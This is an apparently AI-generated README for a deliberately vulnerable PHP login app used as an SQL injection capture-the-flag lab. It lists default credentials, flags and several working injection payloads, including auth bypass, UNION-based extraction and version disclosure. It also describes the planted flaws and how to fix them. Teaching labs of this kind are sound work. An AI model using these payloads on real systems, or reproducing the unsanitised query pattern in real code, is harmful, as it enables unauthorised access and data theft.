Note: I had AI generate a readme 

# 🏴‍☠️ SQL Injection CTF Challenge

A deliberately vulnerable login system designed for learning SQL injection techniques in a safe environment.

## 📋 Prerequisites

- PHP 7.4+ with PDO MySQL extension
- MySQL/MariaDB server
- Web server (Apache/Nginx) or PHP built-in server

## 🚀 Quick Setup

### Option 1: Docker (Recommended)
```bash
# On Linux/Mac
./setup.sh

# On Windows
setup.bat
```

### Option 2: Manual Setup

#### 1. Database Setup
```bash
# Connect to MySQL as root
mysql -u root -p

# Run the setup script
source setup.sql
```

#### 2. Configure Database Connection
Edit `db.php` and update the database credentials:
```php
$host = 'localhost';
$dbname = 'ctf_sqli';
$username = 'root';
$password = 'your_password';
```

#### 3. Start the Web Server
```bash
# Using PHP built-in server
php -S localhost:8000

# Or configure your web server to serve the ctf-sqli directory
```

#### 4. Access the Application
Open your browser and navigate to: `http://localhost:8000`

## 🎯 CTF Challenge

### Objective
Bypass the login authentication using SQL injection to retrieve the hidden CTF flags.

### Available Users (Legitimate Credentials)
- Username: `admin`, Password: `admin123`
- Username: `user1`, Password: `password123`
- Username: `test`, Password: `test123`
- Username: `guest`, Password: `guest123`

## 🔥 SQL Injection Examples

### Basic Authentication Bypass
```
Username: admin' --
Password: anything
```

### Union-Based Injection
```
Username: ' UNION SELECT 1,2,3,4 --
Password: anything
```

### Boolean-Based Injection
```
Username: admin' AND 1=1 --
Password: anything
```

### Error-Based Injection
```
Username: ' OR 1=1 --
Password: anything
```

### Advanced Techniques

#### Get All Users
```
Username: ' OR 1=1 ORDER BY id --
Password: anything
```

#### Get Specific User Data
```
Username: ' UNION SELECT id,username,password,flag FROM users WHERE username='admin' --
Password: anything
```

#### Database Information
```
Username: ' UNION SELECT 1,2,3,@@version --
Password: anything
```

## 🏆 CTF Flags

The application contains multiple flags to discover:

1. **FLAG{SQL_INJECTION_MASTER_2024}** - Admin user flag
2. **FLAG{USER_LEVEL_ACCESS_GRANTED}** - User1 flag
3. **FLAG{TEST_ACCOUNT_COMPROMISED}** - Test user flag
4. **FLAG{GUEST_PRIVILEGES_ESCALATED}** - Guest user flag
5. **FLAG{SUPER_ADMIN_ACCESS_ACHIEVED}** - Hidden superadmin flag

## 🛡️ Security Notes

⚠️ **IMPORTANT**: This application is intentionally vulnerable for educational purposes only. Never deploy this code in a production environment!

### Vulnerabilities Included:
- No input sanitization
- Direct string concatenation in SQL queries
- No prepared statements
- Error messages exposed
- No password hashing

### How to Fix (For Learning):
1. Use prepared statements
2. Implement input validation
3. Hash passwords
4. Hide error messages
5. Use parameterized queries

## 📁 File Structure

```
ctf-sqli/
├── index.html          # Login form
├── style.css           # Styling
├── login.php           # Vulnerable login handler
├── scoreboard.php      # Scoreboard system
├── db.php              # Database connection
├── setup.sql           # Database schema and data
├── Dockerfile          # Docker configuration
├── docker-compose.yml  # Docker Compose setup
├── setup.sh            # Linux/Mac setup script
├── setup.bat           # Windows setup script
├── .gitignore          # Git ignore rules
└── README.md           # This file
```

## 🎓 Learning Objectives

1. Understand SQL injection vulnerabilities
2. Learn common injection techniques
3. Practice manual SQL injection
4. Understand the importance of input validation
5. Learn secure coding practices

## 🔧 Troubleshooting

### Common Issues:

1. **Database Connection Failed**
   - Check MySQL service is running
   - Verify credentials in `db.php`
   - Ensure database exists

2. **Permission Denied**
   - Check file permissions
   - Ensure web server can read files

3. **PDO Extension Missing**
   - Install PHP PDO MySQL extension
   - Restart web server

## 📚 Additional Resources

- [OWASP SQL Injection Guide](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PHP Security Best Practices](https://www.php.net/manual/en/security.php)

## 🤝 Contributing

Feel free to submit issues or enhancement requests for additional vulnerability types or difficulty levels.

---

**Happy Hacking! 🎯** 